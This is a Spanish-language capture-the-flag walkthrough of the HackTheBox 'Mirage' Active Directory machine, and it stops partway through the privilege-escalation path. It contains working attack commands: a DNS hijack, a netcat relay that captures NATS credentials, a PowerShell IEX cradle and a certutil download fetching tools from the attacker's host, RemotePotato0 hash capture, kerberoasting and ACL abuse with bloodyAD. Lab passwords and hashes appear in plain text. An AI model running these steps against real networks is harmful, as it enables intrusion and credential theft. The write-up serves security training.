---
title: "Mirage ⭐️"
---

# Mirage ⭐️

#htb #windows #ActiveDirectory #bloodyad #bloodhound #asreproast #gmsa #dpapi #writeup

<img src="/images/pasted-image-20260730195453.png" alt="Pasted image 20260730195453">

Usamos adscan

```
start_unauth mirage.htb 10.129.232.163
```

No nos encuentra nada.

```bash
sudo nmap -p- -vvv -sS 10.129.232.163 -Pn --open -n --min-rate 5000 -oG allPorts
```

```bash
sudo nmap -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49664,49665,49666,49667,49668,50722,50723,50724,50741,50742,50815,50851,64881 10.129.232.163 -sCV -oN targeted
```

Fuzzeamos la web a ver si encontramos directorios:

```bash
gobuster dir -u http://10.129.232.163:47001/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -t 150 -k -b 404,400
```

Listamos los mounts de [NFS](/network-pentest/pentest-by-ports/111-2049-nfs) 

<img src="/images/pasted-image-20260730204623.png" alt="Pasted image 20260730204623">

Montamos

```bash
mkdir MirageReports

sudo mount -t nfs -o noresvport 10.129.232.163:/MirageReports ./MirageReports
```

<img src="/images/pasted-image-20260730205132.png" alt="Pasted image 20260730205132">

```bash
sudo cp ./MirageReports/*.pdf .

sudo chown $USER:$USER *.pdf
```

Vemos dos informes

Uno que habla de que quieren desactivar NTLM y cambiarlo por kerberos:

<img src="/images/pasted-image-20260730205914.png" alt="Pasted image 20260730205914">

Y otro que habla de que hay un subdominio que no está registrado que muchas aplicaciones están utilizando.

<img src="/images/pasted-image-20260730210106.png" alt="Pasted image 20260730210106">

Es posible que podamos aprovechar esta situación para hacer un mitm.

Comprobamos que efectivamente NTLM ha sido deshabilitado, el SMB signing está habilitado pero no el LDAP signing ni binding.

<img src="/images/pasted-image-20260730210603.png" alt="Pasted image 20260730210603">

Además en los pdfs encontramos nombres de usuario

```
Dev_Account_A
ad_security
```

```bash
/opt/kerbrute/kerbrute_linux_amd64 userenum --dc 10.129.232.163 -d mirage.htb users.txt
```

Nos encuentra uno:

<img src="/images/pasted-image-20260730211725.png" alt="Pasted image 20260730211725">

Probamos AS-REP Roasting sin éxito

```bash
nxc ldap 10.129.232.163 -u users.txt --asreproast asreproast.txt
```

Probamos un password spraying sin éxito

<img src="/images/pasted-image-20260730212252.png" alt="Pasted image 20260730212252">

Podemos aprovechar este escenario para hostear nuestro propio servidor [NATS](/network-pentest/pentest-by-ports/4222-nats-and-jetstream) y esperar a que alguien se autentique

Podemos intentar cambiar los registros DNS de forma anónima (normalmente necesitaríamos una credencial de mínimo privilegio)

```bash
nsupdate
> server 10.129.232.163
> update add nats-svc.mirage.htb 60 A 10.10.15.3
> send
```

Podemos hacer un servidor falso que clone el original
Un cliente cualquiera que se conecte solo verificará la cabecera antes de enviar las credenciales, las veremos en texto plano.

```bash
nc REAL_NATS 4222 | head -1 | nc -lnvp 4222
```

<img src="/images/pasted-image-20260730223955.png" alt="Pasted image 20260730223955">

```
Dev_Account_A \ hx5h7F5554fP@1337!
```

Podemos aprovechar las creds para conectarnos autenticado

```bash
nats context add mirage -s nats://dc01.mirage.htb --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```

Y si miramos los logs de autenticaciones anteriores

```bash
/home/M0B/go/bin/nats stream view auth_logs --context mirage
```

<img src="/images/pasted-image-20260730224636.png" alt="Pasted image 20260730224636">

Probamos a ver si son creds de dominio y parece ser que si

```bash
impacket-getTGT  -dc-ip 10.129.232.163 mirage.htb/david.jjackson:'pN8kQmn6b86!1234@'
```

<img src="/images/pasted-image-20260730224940.png" alt="Pasted image 20260730224940">

```bash
david.jjackson \ pN8kQmn6b86!1234@
```

Corremos adscan

Podemos hacer kerberoasting a un usuario

<img src="/images/pasted-image-20260731115614.png" alt="Pasted image 20260731115614">

Recuperamos su pass

<img src="/images/pasted-image-20260731115740.png" alt="Pasted image 20260731115740">

```
nathan.aadam \ 3edc#EDC3
```

Podemos conectarnos por winrm

<img src="/images/pasted-image-20260731115802.png" alt="Pasted image 20260731115802">

```bash
evil-winrm -i DC01.mirage.htb -r mirage.htb -u 'nathan.aadam'
```

Buscamos si hay DPAPI CREDS

```bash
dir C:\Users\nathan.aadam\AppData\Roaming\Microsoft\Credentials -Force
```

Antes de nada nos abrimos una shell interactiva

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.15.3/Invoke-RunasCs.ps1')
```

Parece ser que no hay DPAPI creds

Lanzamos las querys maestra en bloodHound-CE

```
MATCH p=(n)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|AllowedToDelegate|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|WriteOwnerLimitedRights|OwnsLimitedRights|CanApplyGPO|ManageCA|ManageCertificates]->(:Base)
WHERE (n:User OR n:Computer)
AND NOT n.name CONTAINS "ADMIN" 
AND NOT n.name CONTAINS "ACCOUNT OPERATORS"
AND NOT n.name CONTAINS "BACKUP OPERATORS"
AND NOT n.name CONTAINS "PRINT OPERATORS"
AND NOT n.name CONTAINS "EXCHANGE"
RETURN p
LIMIT 1000
```

```
MATCH p=(n:Group)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|AllowedToDelegate|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|WriteOwnerLimitedRights|OwnsLimitedRights|CanApplyGPO|ManageCA|ManageCertificates]->(:Base)

// Opcional: Descomenta la siguiente línea para excluir a los grupos de Administradores y Operators y buscar verdaderos "Shadow Admins"
WHERE NOT n.name CONTAINS "ADMIN" 
AND NOT n.name CONTAINS "ACCOUNT OPERATORS"
AND NOT n.name CONTAINS "BACKUP OPERATORS"
AND NOT n.name CONTAINS "PRINT OPERATORS"
AND NOT n.name CONTAINS "EXCHANGE"


RETURN p
LIMIT 1000
```

Encontramos una ruta de escalada

<img src="/images/pasted-image-20260803225804.png" alt="Pasted image 20260803225804">

<img src="/images/pasted-image-20260803230116.png" alt="Pasted image 20260803230116">

Vamos  a necesitar convertirnos en `MARK.BBOND` para ejecutar esas escalada.

Listamos los usuarios logueados:

```bash
Invoke-RunasCs -Username 0xEr3bus -Password 0xEr3bus -LogonType 9 -Command qwinsta
```

Nosotros estamos en la session ID 0 (por el servicio `winrm`) y el usuario `MARK.BBOND` en la 1

<img src="/images/pasted-image-20260806194048.png" alt="Pasted image 20260806194048">

Vamos  a ejecutar [RemotePotato0](/network-pentest/privilege-escalation/active-directory/potatos-and-krbrelayup)

En nuestra máquina nos ponemos en escucha por el puerto 135 y hacemos el forwarding por el 9999 de vuelta a la máquina (porque en la máquina no podemos escuchar en la 135 porque ya está ocupado por un puerto legítimo de rpc)

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.232.163:9999
```

```bash
certutil -urlcache -f http://10
.10.15.3/RemotePotato0.exe RemotePotato0.exe
```

Modo 2 : capturar NetNTLMv2 y hacer potato sobre la sesión 1

```bash
.\RemotePotato0.exe -m 2 -s 1 -x 10.129.232.163
```

<img src="/images/pasted-image-20260806201908.png" alt="Pasted image 20260806201908">

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img src="/images/pasted-image-20260806202225.png" alt="Pasted image 20260806202225">

```
MARK.BBOND \ 1day@atime
```

```bash
impacket-getTGT  -dc-ip 10.129.232.163 mirage.htb/MARK.BBOND:'1day@atime'
```

Vamos a lanzar adscan a ver si nos recorre la ruta completa:

```bash
start_auth mirage.htb 10.129.232.163 MARK.BBOND '1day@atime'
```

<img src="/images/pasted-image-20260806203331.png" alt="Pasted image 20260806203331">

Lo probamos y nos tira un error

```bash
impacket-getTGT  -dc-ip 10.129.232.163 mirage.htb/javier.mmarshall:'I_KqyiXOW1dARZ'
```

<img src="/images/pasted-image-20260806223046.png" alt="Pasted image 20260806223046">

Probamos a habilitarla y lo mismo

```bash
bloodyAD --host DC01.mirage.htb --dc-ip 10.129.232.163 -d mirage.htb -u MARK.BBOND -p '1day@atime' -k remove uac javier.mmarshall -f ACCOUNTDISABLE
```

SI leemos lo DACLs más en detalle

```bash
netexec ldap dc01.mirage.htb -d mirage.htb -u mark.bbond -p '1day@atime' -k -M daclread -o PRINCIPAL='IT_SUPPORT' TARGET='JAVIER.MMARSHALL' ACTION=read
```

Aparte de poderle cambiar la contraseña y habilitarlo, también podemos cambiar las logon hours

<img src="/images/pasted-image-20260806223822.png" alt="Pasted image 20260806223822">

Cada hora de la semana es un bit (168 bits en total) necesitamos poner 21 bytes en 0xFF

```bash
bloodyAD -d mirage.htb --host DC01.mirage.htb -u mark.bbond -p 1day@atime -k set object javier.mmarshall logonHours -v '////////////////////////////' --b64
```

Volvemos a cambiar la pass

```bash
bloodyAD --host DC01.mirage.htb --dc-ip 10.129.232.163 -d mirage.htb -u MARK.BBOND -p '1day@atime' -k set password javier.mmarshall "I_KqyiXOW1dARZ"
```

Y ahora si

```bash
impacket-getTGT  -dc-ip 10.129.232.163 mirage.htb/javier.mmarshall:'I_KqyiXOW1dARZ'
```

Leemos la gmsa

```bash
nxc ldap 10.129.232.163 -u javier.mmarshall  -k --use-kcache --gmsa
```

```bash
Mirage-Service$ \ c7aabcd84e2637a1d667a27220ab6da2
```

```bash
impacket-getTGT  -dc-ip 10.129.232.163 mirage.htb/'Mirage-Service$' -hashes ':c7aabcd84e2637a1d667a27220ab6da2'
```

Vamos a ver que cosas puede hacer `Mirage-Service$` que no se muestran en bloodhound

```bash
bloodyAD --host DC01.mirage.htb --dc-ip 10.129.232.163 -d mirage.htb -u 'Mirage-Service$' -k get writable
```

Nos pone que podemos escribir el UPN de `mark.bbond` ?
